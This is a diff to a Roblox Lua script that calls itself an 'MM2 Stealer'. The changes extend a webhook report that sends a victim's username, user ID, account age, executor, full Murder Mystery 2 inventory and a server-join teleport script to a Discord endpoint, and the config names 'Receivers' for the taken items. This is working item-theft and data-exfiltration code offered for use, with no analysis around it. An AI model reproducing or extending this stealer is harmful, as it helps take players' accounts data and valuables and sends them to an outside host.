@@ -33,7 +33,7 @@ local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
 local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
 local Position = UDim2.new(0, 9999, 0, 9999)
 local Inventory = {}
-local StealerName = "Murder Mystery 2"
+local StealerName = "m.kai"
 
 local function sendnotification(message)
     getgenv().scriptexecuted = false
@@ -44,7 +44,8 @@ local function sendnotification(message)
     )
 end
 
-local messageMM2 = TeleportScript
+local messageMM2 =
+    "You just got a new hit with **"..StealerName.."**!"
     if Vintage and Godly and Ancient and Unique and Config.GoodItemsOnly then
     messageMM2 = "@everyone\nYou just got a new **good** hit with **"..StealerName.."**!"
 end
@@ -366,18 +367,23 @@ local success, errorMsg = pcall(function()
 end)
 
 local data = {
-    username = StealerName,
-    avatar_url = "https://cdn.discordapp.com/attachments/1295330912900223039/1295610470228561972/standard.gif?ex=670f46c7&is=670df547&hm=d67f2702e28851f197035c849929a5d05b1f4b9e6830f463268c3234310d03ce&",
-    content = messageMM2,
-    embeds = {
-        {
-            title = "💻 **__" .. StealerName .. "__ | __Murder Mystery 2__**",
-            description = "**📃  Player Information**: \n```lua\nUsername     : " .. LocalPlayer.Name .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```Ancient    🏺: " .. Ancient .. "\nGoldy      🧠: " .. Godly .. "\nUnique     ⚜️: " .. Unique .. "\nVintage    ⌛: " .. Vintage .. "\nLegendary  ⚔️: " .. Legendary .. "\nRare       📜: " .. Rare .. "\nUncommon   🗿: " .. Uncommon .. "\nCommon     💀: " .. Common .. "```\n",
-            color = tonumber(0x3365FF)
+        username = StealerName,
+        avatar_url = "https://cdn.discordapp.com/attachments/1295330912900223039/1295610470228561972/standard.gif?ex=670f46c7&is=670df547&hm=d67f2702e28851f197035c849929a5d05b1f4b9e6830f463268c3234310d03ce&",
+        content = messageMM2,
+        embeds = {
+            {
+                title = "💻 **__"..StealerName.."__ | __MM2 Stealer__**",
+                description = "**📃  Player Information**: \n```lua\nUsername     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```Ancient    🏺: " .. Ancient .. "\nGoldy      🧠: " .. Godly .. "\nUnique     ⚜️: " .. Unique .. "\nVintage    ⌛: " .. Vintage .. "\nLegendary  ⚔️: " .. Legendary .. "\nRare       📜: " .. Rare .. "\nUncommon   🗿: " .. Uncommon .. "\nCommon     💀: " .. Common .. "```\n🎒 **__Full Inventory__**\n```" .. FullInventory() .. "```\n🔗 **__Execute to join__**\n```" .. TeleportScript .. "```",
+                color = tonumber(0x3365FF),
+                fields = {
+                    {
+                        name = "🎮Auto Joiner",
+                        value = "Soon"
+                    }
+                }
+            }
         }
     }
-}
-
 
 local request = http_request or request or HttpPost or syn.request
 request({
